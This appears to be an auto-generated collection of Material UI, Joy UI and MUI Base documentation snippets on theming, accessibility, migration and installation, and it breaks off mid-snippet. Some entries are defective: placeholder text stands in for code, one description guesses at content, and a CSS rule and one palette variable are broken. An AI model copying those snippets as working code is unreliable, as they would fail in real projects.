DESCRIPTION: TypeScript module augmentation for adding custom layout options to the ModalDialog component.

LANGUAGE: typescript
CODE:
declare module '@mui/joy/ModalDialog' {
  interface ModalDialogPropsLayoutOverrides {
    top: true;
  }
}

----------------------------------------

TITLE: Creating a Stable Menu Item for Performance in React
DESCRIPTION: This code snippet shows how to create a wrapper component for MenuItem to improve performance when dealing with large menus.

LANGUAGE: tsx
CODE:
const StableMenuItem = React.forwardRef(function StableMenuItem(
  props: MenuItemProps,
  ref: React.ForwardedRef<Element>,
) {
  const { contextValue, id } = useMenuItemContextStabilizer(props.id);

  return (
    <ListContext.Provider value={contextValue}>
      <MenuItem {...props} id={id} ref={ref} />
    </ListContext.Provider>
  );
});

----------------------------------------

TITLE: Configuring Pigment CSS in Vite
DESCRIPTION: Importing and applying the Pigment CSS plugin in a Vite configuration file.

LANGUAGE: typescript
CODE:
// main.tsx
import { pigment } from '@pigment-css/vite-plugin';

export default defineConfig({
  plugins: [
    pigment(),
    // ... Your other plugins.
  ],
});

----------------------------------------

TITLE: Implementing Custom Transitions with MUI Base Hooks in React
DESCRIPTION: Demonstrates the use of useTransitionTrigger and useTransitionStateManager hooks for creating custom transition components in MUI Base.

LANGUAGE: jsx
CODE:
{"demo": "TransitionHooks.js"}

----------------------------------------

TITLE: Implementing Global CSS Reset with CssBaseline in React
DESCRIPTION: Demonstrates how to implement a global CSS reset using the CssBaseline component from Material-UI. This provides normalized styles across different browsers and establishes consistent baseline styling.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import CssBaseline from '@mui/material/CssBaseline';

export default function MyApp() {
  return (
    <React.Fragment>
      <CssBaseline />
      {/* The rest of your application */}
    </React.Fragment>
  );
}

----------------------------------------

TITLE: Configuring Fixed Columns in React Masonry
DESCRIPTION: Demonstrates how to use the 'columns' prop to set a fixed number of columns in a Masonry layout.

LANGUAGE: jsx
CODE:
{"demo": "FixedColumns.js", "bg": true}

----------------------------------------

TITLE: Implementing CSS Transition in React with MUI Base
DESCRIPTION: Demonstrates how to use the CSS Transition component from MUI Base to smoothly change CSS property values. It applies 'open' and 'close' classes for visibility transitions.

LANGUAGE: jsx
CODE:
{"demo": "CssTransitionComponent.js"}

----------------------------------------

TITLE: Applying Conditional Styles Based on Component Props
DESCRIPTION: Shows how to apply conditional styles to a component based on its props using the styleOverrides callback function.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyChip: {
      styleOverrides: {
        root: ({ ownerState, theme }) => ({
          ...(ownerState.size === 'sm' && {
            borderRadius: theme.vars.radius.xs,
          }),
        }),
      },
    },
  },
});

----------------------------------------

TITLE: Setting Min and Max Values for Number Input in React
DESCRIPTION: This example shows how to set minimum and maximum values for the Number Input component using the 'min' and 'max' props.

LANGUAGE: jsx
CODE:
// accepts any value:
<NumberInput />

// only accepts values between -10 and 10:
<NumberInput min={-10} max={10} />

// only accepts values greater than 0:
<NumberInput min={0} />

----------------------------------------

TITLE: Accessible Form Structure
DESCRIPTION: Example of proper DOM structure for accessible text fields with labels and helper text.

LANGUAGE: jsx
CODE:
<FormControl>
  <InputLabel htmlFor="my-input">Email address</InputLabel>
  <Input id="my-input" aria-describedby="my-helper-text" />
  <FormHelperText id="my-helper-text">We'll never share your email.</FormHelperText>
</FormControl>

----------------------------------------

TITLE: Restructuring component definitions in theme
DESCRIPTION: Move component definitions under the components key in the theme structure.

LANGUAGE: diff
CODE:
 import { createTheme } from '@mui/material/styles';

 const theme = createTheme({
-  props: {
-    MuiButton: {
-      disableRipple: true,
-    },
-  },
+  components: {
+    MuiButton: {
+      defaultProps: {
+        disableRipple: true,
+      },
+    },
+  },
 });

LANGUAGE: diff
CODE:
 import { createTheme } from '@mui/material/styles';

 const theme = createTheme({
-  overrides: {
-    MuiButton: {
-      root: { padding: 0 },
-    },
-  },
+  components: {
+    MuiButton: {
+      styleOverrides: {
+        root: { padding: 0 },
+      },
+    },
+  },
 });

----------------------------------------

TITLE: Installing Material UI with styled-components
DESCRIPTION: Commands to install Material UI with styled-components instead of Emotion using different package managers.

LANGUAGE: bash
CODE:
npm install @mui/material @mui/styled-engine-sc styled-components

LANGUAGE: bash
CODE:
pnpm add @mui/material @mui/styled-engine-sc styled-components

LANGUAGE: bash
CODE:
yarn add @mui/material @mui/styled-engine-sc styled-components

----------------------------------------

TITLE: Modal Theme Customization
DESCRIPTION: Example of extending theme configuration for ModalDialog component with custom layout options and TypeScript type definitions.

LANGUAGE: jsx
CODE:
const theme = extendTheme({
  components: {
    JoyModalDialog: {
      defaultProps: { layout: 'top' },
      styleOverrides: {
        root: ({ ownerState }) => ({
          ...(ownerState.layout === 'top' && {
            top: '12vh',
            left: '50%',
            transform: 'translateX(-50%)',
          }),
        }),
      },
    },
  },
});

----------------------------------------

TITLE: Using RadioGroup Hook in React
DESCRIPTION: Example of using the useRadioGroup hook for advanced customization of radio group components. The hook returns the context value of the parent radio group including name, onChange handler, and selected value.

LANGUAGE: jsx
CODE:
import { useRadioGroup } from '@mui/material/RadioGroup';

----------------------------------------

TITLE: Radio Group Rating Implementation
DESCRIPTION: Implements rating as a radio group with highlightSelectedOnly behavior.

LANGUAGE: JavaScript
CODE:
RadioGroupRating.js

----------------------------------------

TITLE: Implementing Manual Tab Selection - React/JSX
DESCRIPTION: Example of implementing tabs where each tab needs to be manually selected.

LANGUAGE: jsx
CODE:
/* Tabs where each tab needs to be selected manually */
<Tabs />

----------------------------------------

TITLE: TypeScript Usage with Custom Components
DESCRIPTION: Examples of using the Slider component with TypeScript, including custom component types and primitive elements.

LANGUAGE: tsx
CODE:
<Slider<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

LANGUAGE: tsx
CODE:
<Slider<'input'> slots={{ root: 'input' }} autoFocus={true} />

----------------------------------------

TITLE: Basic Badge HTML Structure
DESCRIPTION: Shows the default HTML structure of the Badge component with its root and badge slots.

LANGUAGE: html
CODE:
<span class="BaseBadge-root">
  <!-- the element the badge is attached to is nested here -->
  <span class="BaseBadge-badge">badge content</span>
</span>

----------------------------------------

TITLE: Controlling Checkbox State in React
DESCRIPTION: This snippet demonstrates how to control a checkbox's state using the 'checked' and 'onChange' props in React. It shows the implementation of a controlled checkbox component.

LANGUAGE: JSX
CODE:
{"demo": "ControlledCheckbox.js"}

----------------------------------------

TITLE: Enabling Color Scheme Support in CssBaseline
DESCRIPTION: Demonstrates how to enable color scheme support for native components using the enableColorScheme prop. This allows switching between light and dark modes for elements like scrollbars.

LANGUAGE: jsx
CODE:
<CssBaseline enableColorScheme />

// or

<ScopedCssBaseline enableColorScheme >
  {/* The rest of your application using color-scheme*/}
</ScopedCssBaseline>

----------------------------------------

TITLE: Ref Handling Implementation
DESCRIPTION: Demonstrates proper ref handling in hooks using useForkRef to merge external and internal refs.

LANGUAGE: typescript
CODE:
interface AwesomeControlHookParameters {
  rootRef?: React.Ref<Element>;
  // ...
}

const useAwesomeControlHook = (parameters: AwesomeControlHookParameters) {
  const { rootRef: externalRef } = parameters;
  const innerRef = React.useRef<HTMLDivElement>(null);

  const handleRef = useForkRef(externalRef, innerRef);

  return {
    // parameters omitted for the sake of brevity
    getRootProps: () => {
      ref: handleRef
    },
    rootRef: handleRef
  }
}

----------------------------------------

TITLE: Importing Click-Away Listener in React
DESCRIPTION: Basic import statement for the Click-Away Listener component from MUI Base UI.

LANGUAGE: jsx
CODE:
import { ClickAwayListener } from '@mui/base/ClickAwayListener';

----------------------------------------

TITLE: Importing Drawer Component in React
DESCRIPTION: This snippet shows how to import the Drawer component from MUI Joy UI. The Drawer is used for navigation and can be closed by user actions or keyboard events.

LANGUAGE: jsx
CODE:
import Drawer from '@mui/joy/Drawer';

----------------------------------------

TITLE: Custom Input Component Interface
DESCRIPTION: TypeScript interface definition for custom input components used with TextField.

LANGUAGE: typescript
CODE:
interface InputElement {
  focus(): void;
  value?: string;
}

----------------------------------------

TITLE: Refactoring array-based values to string-based in theme overrides
DESCRIPTION: Replace array-based syntax for space- and comma-separated values with string-based syntax in theme overrides.

LANGUAGE: jsx
CODE:
const theme = createTheme({
  components: {
    MuiBox: {
      styleOverrides: {
        root: {
          background:
            'url(image1.png) no-repeat top, url(image2.png) no-repeat center !important',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Opting Out of RTL with styled-components
DESCRIPTION: Example of disabling RTL transformation for specific components using the @noflip directive

LANGUAGE: javascript
CODE:
const LeftToRightTextInRtlApp = styled('div')`
  /* @noflip */
  text-align: left;
`;

----------------------------------------

TITLE: Customizing Select Indicator in Joy UI Theme
DESCRIPTION: Shows how to customize the indicator for all instances of the Select component by modifying the theme. This example changes the default indicator to an up-down arrow symbol.

LANGUAGE: js
CODE:
import { extendTheme, CssVarsProvider } from '@mui/joy/styles';
import Select from '@mui/joy/Select';

const theme = extendTheme({
  components: {
    JoySelect: {
      defaultProps: {
        indicator: '↕',
      },
    },
  },
});

const App = () => (
  <CssVarsProvider theme={theme}>
    <Select>...options</Select>
  </CssVarsProvider>
);

----------------------------------------

TITLE: Customizing Breakpoints in Material UI Theme
DESCRIPTION: This example shows how to customize the default breakpoint values in the Material UI theme. It provides custom values for xs, sm, md, lg, and xl breakpoints.

LANGUAGE: jsx
CODE:
const theme = createTheme({
  breakpoints: {
    values: {
      xs: 0,
      sm: 600,
      md: 900,
      lg: 1200,
      xl: 1536,
    },
  },
});

----------------------------------------

TITLE: Implementing Transition Component with Ref Forwarding in React
DESCRIPTION: Demonstrates how to properly implement a component that works with Material UI transitions. Shows ref forwarding and style prop handling required for transition components.

LANGUAGE: jsx
CODE:
// The `props` object contains a `style` prop.
// You need to provide it to the `div` element as shown here.
const MyComponent = React.forwardRef(function (props, ref) {
  return (
    <div ref={ref} {...props}>
      Fade
    </div>
  );
});

export default function Main() {
  return (
    <Fade>
      {/* MyComponent must be the only child */}
      <MyComponent />
    </Fade>
  );
}

----------------------------------------

TITLE: Updating Table Component Props
DESCRIPTION: Remove deprecated props and update usage for TableCell, TableRow, and TablePagination components.

LANGUAGE: diff
CODE:
-<TableCell numeric>{row.calories}</TableCell>
+<TableCell align="right">{row.calories}</TableCell>

-<TableCell padding="dense" />
+<TableCell size="small" />

// TablePagination now raises warnings for invalid prop combinations

----------------------------------------

TITLE: Avatar Groups with Custom Spacing in React MUI
DESCRIPTION: AvatarGroup component allows grouping avatars with customizable spacing and maximum display count.

LANGUAGE: JSX
CODE:
Spacing.js referenced but not provided in the input text

----------------------------------------

TITLE: Dense Menu Implementation
DESCRIPTION: Demonstrates a compact menu variant with reduced padding and text size for long lists.

LANGUAGE: jsx
CODE:
{"demo": "DenseMenu.js", "bg": true}

----------------------------------------

TITLE: Scroll Playground for Popper in React
DESCRIPTION: Provides an interactive demonstration of how the Popper component behaves in different scroll scenarios, showcasing its ability to maintain position.

LANGUAGE: JavaScript
CODE:
{"demo": "ScrollPlayground.js", "hideToolbar": true, "bg": true}

----------------------------------------

TITLE: Native Select with Accessible Labels
DESCRIPTION: Shows implementation of native select element with proper accessibility labeling using InputLabel and htmlFor attribute.

LANGUAGE: jsx
CODE:
<InputLabel htmlFor="select">Age</InputLabel>
<NativeSelect id="select">
  <option value="10">Ten</option>
  <option value="20">Twenty</option>
</NativeSelect>

----------------------------------------

TITLE: Importing Popup Component in React
DESCRIPTION: Shows how to import the Popup component from MUI Base. This is the basic setup required to use the component in a React application.

LANGUAGE: jsx
CODE:
import { Unstable_Popup as Popup } from '@mui/base/Unstable_Popup';

----------------------------------------

TITLE: Color-Themed Badge in React
DESCRIPTION: Shows how to apply theme palette colors to badges using the color prop.

LANGUAGE: jsx
CODE:
ColorBadge.js referenced but not provided

----------------------------------------

TITLE: Implementing Clickable Chips in React
DESCRIPTION: Shows how to create clickable Chip components using the onClick prop.

LANGUAGE: JSX
CODE:
{"demo": "ClickableChips.js"}

----------------------------------------

TITLE: Adding Aria Label to Switch Component
DESCRIPTION: Example of adding an aria-label to the Switch component for better accessibility when a visible label is not present.

LANGUAGE: jsx
CODE:
<Switch value="checkedA" slotProps={{ 'aria-label': 'Switch A' }} />

----------------------------------------

TITLE: Implementing Button-based Links
DESCRIPTION: Demonstrates proper implementation of button-based links for cases where href is not meaningful, following accessibility best practices.

LANGUAGE: JSX
CODE:
{"demo": "ButtonLink.js"}

----------------------------------------

TITLE: Custom Theme Type Extension in TypeScript
DESCRIPTION: Example showing how to extend the Theme type using TypeScript module augmentation to add custom theme properties.

LANGUAGE: tsx
CODE:
import * as React from 'react';
import Box from '@mui/material/Box';
import { createTheme, ThemeProvider } from '@mui/material/styles';
import { orange } from '@mui/material/colors';

declare module '@mui/system' {
  interface Theme {
    status: {
      warning: string;
    };
  }
}

const theme = createTheme({
  status: {
    warning: orange[500],
  },
});

export default function App() {
  return (
    <ThemeProvider theme={theme}>
      <Box
        sx={(theme) => ({
          bgcolor: theme.status.warning,
        })}
      >
        Example
      </Box>
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Adjusting Color Opacity with CSS Variables in Joy UI
DESCRIPTION: This example demonstrates how to adjust color opacity using automatically generated opacity channel tokens in Joy UI.

LANGUAGE: js
CODE:
const Div = styled('div')(({ theme }) => ({
  backgroundColor: `rgba(${theme.vars.palette.primary.mainChannel} / 0.2)`,
}));

----------------------------------------

TITLE: Extending Component Sizes in Joy UI Theme
DESCRIPTION: Demonstrates how to add custom sizes to a Joy UI component and use TypeScript module augmentation for type safety.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyButton: {
      styleOverrides: {
        root: ({ ownerState, theme }) => ({
          ...(ownerState.size === 'xs' && {
            '--Icon-fontSize': '1rem',
            '--Button-gap': '0.25rem',
            minHeight: 'var(--Button-minHeight, 1.75rem)',
            fontSize: theme.vars.fontSize.xs,
            paddingBlock: '2px',
            paddingInline: '0.5rem',
          }),
          ...(ownerState.size === 'xl' && {
            '--Icon-fontSize': '2rem',
            '--Button-gap': '1rem',
            minHeight: 'var(--Button-minHeight, 4rem)',
            fontSize: theme.vars.fontSize.xl,
            paddingBlock: '0.5rem',
            paddingInline: '2rem',
          }),
        }),
      },
    },
  },
});

LANGUAGE: typescript
CODE:
declare module '@mui/joy/Button' {
  interface ButtonPropsSizeOverrides {
    xs: true;
    xl: true;
  }
}

----------------------------------------

TITLE: Replacing css prop with sx in System
DESCRIPTION: Replace css prop with sx prop to avoid collision with styled-components and Emotion.

LANGUAGE: diff
CODE:
-<Box css={{ color: 'primary.main' }} />
+<Box sx={{ color: 'primary.main' }} />

----------------------------------------

TITLE: Fixing Component Propagation with Emotion
DESCRIPTION: Example showing how the 'as' prop is not propagated when using Emotion as the style engine

LANGUAGE: jsx
CODE:
<MuiComponent component={SomeOtherComponent} as="button" />

----------------------------------------

TITLE: Accessible IconButton Implementation - JavaScript
DESCRIPTION: Example of implementing an IconButton with proper accessibility attributes using aria-label

LANGUAGE: js
CODE:
<IconButton aria-label="Add to favorites">
  <FavoriteBorder />
</IconButton>

----------------------------------------

TITLE: Basic Select Component Accessibility Implementation
DESCRIPTION: Shows how to properly implement accessibility labels for a Select component using InputLabel with matching labelId properties.

LANGUAGE: jsx
CODE:
<InputLabel id="label">Age</InputLabel>
<Select labelId="label" id="select" value="20">
  <MenuItem value="10">Ten</MenuItem>
  <MenuItem value="20">Twenty</MenuItem>
</Select>

----------------------------------------

TITLE: Implementing Controlled Switches in React
DESCRIPTION: Shows how to create controlled switches using the checked and onChange props in Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "ControlledSwitches.js"}

----------------------------------------

TITLE: Rendering TextField Example in Markdown
DESCRIPTION: This snippet demonstrates how to properly test a TextField component in Material UI, emphasizing the importance of querying for generic elements rather than specific Material UI instances.

LANGUAGE: markdown
CODE:
For example, when rendering a `TextField` your test should not need to query for the specific Material UI instance of the `TextField` but rather for the `input`, or `[role="textbox"]`.

----------------------------------------

TITLE: Updating Paper Default Elevation
DESCRIPTION: Increase the default elevation of Paper component to match Card and ExpansionPanel.

LANGUAGE: diff
CODE:
-<Paper />
+<Paper elevation={2} />

----------------------------------------

TITLE: Alert Background Color Override
DESCRIPTION: Example of overriding Alert background color when used with Snackbar component to prevent content bleed-through

LANGUAGE: jsx
CODE:
<Alert sx={{ bgcolor: 'background.paper' }} />

----------------------------------------

TITLE: Customizing Switch Color in React
DESCRIPTION: Demonstrates how to customize the color of switches in Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "ColorSwitches.js"}

----------------------------------------

TITLE: Augmenting DefaultTheme for Material UI v5 in JavaScript
DESCRIPTION: This JavaScript code snippet demonstrates how to augment the DefaultTheme interface for IDEs like VS Code, resolving type inference issues with Material UI v5 themes.

LANGUAGE: javascript
CODE:
// index.d.ts
declare module '@mui/private-theming' {
  import type { Theme } from '@mui/material/styles';

  interface DefaultTheme extends Theme {}
}

----------------------------------------

TITLE: Demonstrating Sheet Component with Various Props
DESCRIPTION: This code snippet demonstrates the usage of the Sheet component with different props, including color variations. It showcases how the Sheet component can be customized using the color prop to access every palette of the theme.

LANGUAGE: jsx
CODE:
<Sheet>Holy sheet!</Sheet>

----------------------------------------

TITLE: Using Style Utilities for Custom Colors in JavaScript
DESCRIPTION: This example shows how to use Material UI's style utilities like alpha() and getContrastRatio() to define custom color tokens.

LANGUAGE: javascript
CODE:
import { createTheme, alpha, getContrastRatio } from '@mui/material/styles';

const violetBase = '#7F00FF';
const violetMain = alpha(violetBase, 0.7);

const theme = createTheme({
  palette: {
    violet: {
      main: violetMain,
      light: alpha(violetBase, 0.5),
      dark: alpha(violetBase, 0.9),
      contrastText: getContrastRatio(violetMain, '#fff') > 4.5 ? '#fff' : '#111',
    },
  },
});

----------------------------------------

TITLE: Express Server Basic Setup
DESCRIPTION: Sets up an Express server with middleware structure for handling server-side rendering requests.

LANGUAGE: javascript
CODE:
import express from 'express';

// We are going to fill these out in the sections to follow.
function renderFullPage(html, css) {
  /* ... */
}

function handleRender(req, res) {
  /* ... */
}

const app = express();

// This is fired every time the server-side receives a request.
app.use(handleRender);

const port = 3000;
app.listen(port);

----------------------------------------

TITLE: Handling Variable Height Items in React Masonry
DESCRIPTION: Illustrates the use of Masonry for items with variable heights. Items can move between columns to optimize space usage.

LANGUAGE: jsx
CODE:
{"demo": "MasonryWithVariableHeightItems.js", "bg": true}

----------------------------------------

TITLE: Customizing ScopedCssBaseline using Themed Components in Joy UI
DESCRIPTION: This snippet demonstrates how to customize the ScopedCssBaseline component using the themed components approach. It involves extending the theme and overriding styles for the JoyScopedCssBaseline component.

LANGUAGE: js
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';
import ScopedCssBaseline from '@mui/joy/ScopedCssBaseline';
import MyApp from './MyApp';

const theme = extendTheme({
  components: {
    JoyScopedCssBaseline: {
      styleOverrides: {
        root: ({ theme }) => ({
          // ...CSS object styles
        })
      }
    }
  }
})

export default function MyApp() {
  const [root, setRoot] = React.useState(null);
  return (
    {/* target the node to ScopedCssBaseline's div */}
    <CssVarsProvider colorSchemeNode={root}>
      {/* must be used under CssVarsProvider */}
      <ScopedCssBaseline ref={(element) => setRoot(element)}>
        {/* The rest of your application */}
        <MyApp />
      </ScopedCssBaseline>
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Basic Usage of Stack Component with Spacing
DESCRIPTION: This example demonstrates the basic usage of the Stack component. The 'spacing' prop is used to control the space between children. The spacing value can be any number or string and is converted using the theme.spacing() helper.

LANGUAGE: jsx
CODE:
{"demo": "BasicStack.js", "bg": true}

----------------------------------------

TITLE: Keeping old Chip default props
DESCRIPTION: Code to maintain the previous default variant and color for the Chip component.

LANGUAGE: javascript
CODE:
extendTheme({
  components: {
    JoyChip: {
      defaultProps: {
        variant: 'solid',
        color: 'primary',
      },
    },
  },
});

----------------------------------------

TITLE: Wrapping Disabled Button for Custom Cursor
DESCRIPTION: Demonstrates an alternative approach to customizing the cursor for disabled buttons by wrapping the Button component in a span element with a custom style.

LANGUAGE: jsx
CODE:
<span style={{ cursor: 'not-allowed' }}>
  <Button component={Link} disabled>
    disabled
  </Button>
</span>

----------------------------------------

TITLE: Updating List Component Usage
DESCRIPTION: Update List and ListItem components to match new specifications and styling changes.

LANGUAGE: diff
CODE:
// New requirements for List components
<ListItemAvatar>
  <Avatar />
</ListItemAvatar>

<ListItemIcon>
  <Checkbox edge="start" />
</ListItemIcon>

// ListItem style changes
- <ListItem disabled />
+ <ListItem disabled style={{ pointerEvents: 'none' }} />

----------------------------------------

TITLE: Stack Component HTML Structure
DESCRIPTION: Shows the basic HTML structure generated by the Stack component.

LANGUAGE: html
CODE:
<div class="MuiStack-root">
  <!-- Stack contents -->
</div>

----------------------------------------

TITLE: Adding Dividers to Stack
DESCRIPTION: This example demonstrates how to use the 'divider' prop to insert an element between each child in the Stack component.

LANGUAGE: jsx
CODE:
{"demo": "DividerStack.js", "bg": true}

----------------------------------------

TITLE: Extending theme with removed info palette
DESCRIPTION: Example of how to add the removed info palette back to the Joy UI theme using extendTheme.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const info = {
  50: '#FDF7FF',
  100: '#F4EAFF',
  200: '#E1CBFF',
  300: '#C69EFF',
  400: '#A374F9',
  500: '#814DDE',
  600: '#5F35AE',
  700: '#452382',
  800: '#301761',
  900: '#1D0A42',
};

const theme = extendTheme({
  colorSchemes: {
    light: {
      palette: {
        info: {
          ...info,
          plainColor: `var(--joy-palette-info-600)`,
          plainHoverBg: `var(--joy-palette-info-100)`,
          plainActiveBg: `var(--joy-palette-info-200)`,
          plainDisabledColor: `var(--joy-palette-info-200)`,
          outlinedColor: `var(--joy-palette-info-500)`,
          outlinedBorder: `var(--joy-palette-info-200)`,
          outlinedHoverBg: `var(--joy-palette-info-100)`,
          outlinedHoverBorder: `var(--joy-palette-info-300)`,
          outlinedActiveBg: `var(--joy-palette-info-200)`,
          outlinedDisabledColor: `var(--joy-palette-info-100)`,
          outlinedDisabledBorder: `var(--joy-palette-info-100)`,
          softColor: `var(--joy-palette-info-600)`,
          softBg: `var(--joy-palette-info-100)`,
          softHoverBg: `var(--joy-palette-info-200)`,
          softActiveBg: `var(--joy-palette-info-300)`,
          softDisabledColor: `var(--joy-palette-info-300)`,
          softDisabledBg: `var(--joy-paletteinfo}-50)`,
          solidColor: '#fff',
          solidBg: `var(--joy-palette-info-500)`,
          solidHoverBg: `var(--joy-palette-info-600)`,
          solidActiveBg: `var(--joy-palette-info-700)`,
          solidDisabledColor: `#fff`,
          solidDisabledBg: `var(--joy-palette-info-200)`,
        },
      },
    },
    dark: {
      palette: {
        info: {
          ...info,
          plainColor: `var(--joy-palette-info-300)`,
          plainHoverBg: `var(--joy-palette-info-800)`,
          plainActiveBg: `var(--joy-palette-info-700)`,
          plainDisabledColor: `var(--joy-palette-info-800)`,
          outlinedColor: `var(--joy-palette-info-200)`,
          outlinedBorder: `var(--joy-palette-info-700)`,
          outlinedHoverBg: `var(--joy-palette-info-800)`,
          outlinedHoverBorder: `var(--joy-palette-info-600)`,
          outlinedActiveBg: `var(--joy-palette-info-900)`,
          outlinedDisabledColor: `var(--joy-palette-info-800)`,
          outlinedDisabledBorder: `var(--joy-palette-info-800)`,
          softColor: `var(--joy-palette-info-200)`,
          softBg: `var(--joy-palette-info-900)`,
          softHoverBg: `var(--joy-palette-info-800)`,
          softActiveBg: `var(--joy-palette-info-700)`,
          softDisabledColor: `var(--joy-palette-info-800)`,
          softDisabledBg: `var(--joy-palette-info-900)`,
          solidColor: `#fff`,
          solidBg: `var(--joy-palette-info-600)`,
          solidHoverBg: `var(--joy-palette-info-700)`,
          solidActiveBg: `var(--joy-palette-info-800)`,
          solidDisabledColor: `var(--joy-palette-info-700)`,
          solidDisabledBg: `var(--joy-palette-info-900)`,
        },
      },
    },
  },
});

----------------------------------------

TITLE: Spring-based Popper Animation in React
DESCRIPTION: Illustrates an alternative animation approach for the Popper component using react-spring library, providing more dynamic and flexible animations.

LANGUAGE: JavaScript
CODE:
{"demo": "SpringPopper.js"}

----------------------------------------

TITLE: Adding Custom Color Tokens to Joy UI Theme
DESCRIPTION: Demonstrates how to add new color tokens to the Joy UI theme, making them available through the color prop and accessible via styled and sx APIs. This example adds a gradient color token.

LANGUAGE: javascript
CODE:
extendTheme({
  colorSchemes: {
    light: {
      palette: {
        // `gradient` is a new color token
        gradient: {
          primary: 'linear-gradient(to top, var(--joy-palette-primary-main), #000)',
        },
      },
    },
  },
});

// `sx` prop usage example:
<Button sx={{ background: (theme) => theme.vars.palette.gradient.primary }} />;

----------------------------------------

TITLE: Automatic Input Adjustment Example in Joy UI
DESCRIPTION: Demonstrates how Joy UI's Input component automatically calculates and adjusts dimensions relative to border radius for optimal presentation.

LANGUAGE: jsx
CODE:
{{"demo": "../../main-features/automatic-adjustment/InputVariables.js"}}

----------------------------------------

TITLE: Updating Divider Props
DESCRIPTION: Replace the deprecated inset prop with the new variant prop for Divider component.

LANGUAGE: diff
CODE:
-<Divider inset />
+<Divider variant="inset" />

----------------------------------------

TITLE: Importing Stack Component in React
DESCRIPTION: Basic import statement for the Stack component from Material-UI.

LANGUAGE: jsx
CODE:
import Stack from '@mui/material/Stack';

----------------------------------------

TITLE: Accessing DOM Elements in MUI Components
DESCRIPTION: This code demonstrates how to access the underlying DOM element of a MUI component using a ref.

LANGUAGE: jsx
CODE:
// or a ref setter function
const ref = React.createRef();
// render
<Button ref={ref} />;
// usage
const element = ref.current;

----------------------------------------

TITLE: Implementing Basic Masonry in React
DESCRIPTION: Demonstrates a simple example of using the Masonry component. It can contain various elements including div and img tags.

LANGUAGE: jsx
CODE:
{"demo": "BasicMasonry.js", "bg": true}

----------------------------------------

TITLE: Ignoring Clickaway for Snackbar Close in React
DESCRIPTION: Pattern to prevent Snackbar from closing when user clicks outside of it.

LANGUAGE: js
CODE:
<Snackbar
  onClose={(event, reason) => {
    if (reason === 'clickaway') {
      return;
    }
  }}
>

----------------------------------------

TITLE: Customizing CssBaseline with GlobalStyles in Joy UI
DESCRIPTION: This snippet shows how to customize the styles produced by the CssBaseline component using the GlobalStyles component. It allows for adding custom CSS object styles to html and body elements.

LANGUAGE: js
CODE:
import { CssVarsProvider } from '@mui/joy/styles';
import CssBaseline from '@mui/joy/CssBaseline';
import GlobalStyles from '@mui/joy/GlobalStyles';

function App() {
  return (
    <CssVarsProvider>
      <CssBaseline /> {/* CssBaseline must come first */}
      <GlobalStyles
        styles={{
          // CSS object styles
          html: {
            // ...
          },
          body: {
            // ...
          },
        }}
      />
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Server-Side Rendering with ServerStyleSheets
DESCRIPTION: Illustrates how to implement server-side rendering with @mui/styles using ServerStyleSheets to collect and inject critical CSS.

LANGUAGE: jsx
CODE:
import * as ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@mui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}

----------------------------------------

TITLE: Creating Extended Size Floating Action Buttons in React
DESCRIPTION: Illustrates the implementation of extended size Floating Action Buttons (FAB) in React. This snippet probably shows FABs with additional text or wider dimensions.

LANGUAGE: jsx
CODE:
"FloatingActionButtonExtendedSize.js"

----------------------------------------

TITLE: Using TypeScript with Custom Tab Components
DESCRIPTION: These snippets show how to use TypeScript with custom Tab components, specifying custom types for the root slot and handling custom props.

LANGUAGE: tsx
CODE:
<Tab<typeof CustomComponent> slots={{ root: CustomComponent }} customProp />

LANGUAGE: tsx
CODE:
<Tab<'button'> slots={{ root: 'button' }} onClick={() => {}} />

----------------------------------------

TITLE: Interactive Stack Demo
DESCRIPTION: This code snippet represents an interactive demo that allows users to explore the visual results of different Stack settings.

LANGUAGE: jsx
CODE:
{"demo": "InteractiveStack.js", "hideToolbar": true, "bg": true}

----------------------------------------

TITLE: Alert Component DOM Structure
DESCRIPTION: HTML structure showing how the Alert component renders in the DOM with icon, message, and optional action areas

LANGUAGE: html
CODE:
<div class="MuiPaper-root MuiAlert-root" role="alert">
  <div class="MuiAlert-icon">
    <!-- svg icon here -->
  </div>
  <div class="MuiAlert-message">This is how an Alert renders in the DOM.</div>
  <div class="MuiAlert-action">
    <!-- optional action element here -->
  </div>
</div>

----------------------------------------

TITLE: Disabling Transitions and Animations with CSS
DESCRIPTION: This CSS snippet shows how to disable all transitions and animations globally without using MUI's CssBaseline component.

LANGUAGE: css
CODE:
*,
*::before,
*::after {
  transition: 'none !important';
  animation: 'none !important';
}

----------------------------------------

TITLE: Installing Roboto Font with npm/pnpm/yarn
DESCRIPTION: Commands to install the Roboto font using Fontsource with different package managers.

LANGUAGE: bash
CODE:
npm install @fontsource/roboto

LANGUAGE: bash
CODE:
pnpm add @fontsource/roboto

LANGUAGE: bash
CODE:
yarn add @fontsource/roboto

----------------------------------------

TITLE: Importing Portal Component in React
DESCRIPTION: Shows how to import the Portal component from Material-UI for use in a React application.

LANGUAGE: jsx
CODE:
import Portal from '@mui/material/Portal';

----------------------------------------

TITLE: Boolean Props Type Definition in TypeScript
DESCRIPTION: Example showing how to define boolean prop types for component variations

LANGUAGE: tsx
CODE:
type Props = {
  contained: boolean;
  fab: boolean;
};

----------------------------------------

TITLE: Configuring Stack Theme with Flexbox Gap
DESCRIPTION: Example of creating a theme configuration to enable flexbox gap by default for all Stack instances using CssVarsProvider.

LANGUAGE: js
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';
import Stack from '@mui/joy/Stack';

const theme = extendTheme({
  components: {
    JoyStack: {
      defaultProps: {
        useFlexGap: true,
      },
    },
  },
});

function App() {
  return (
    <CssVarsProvider theme={theme}>
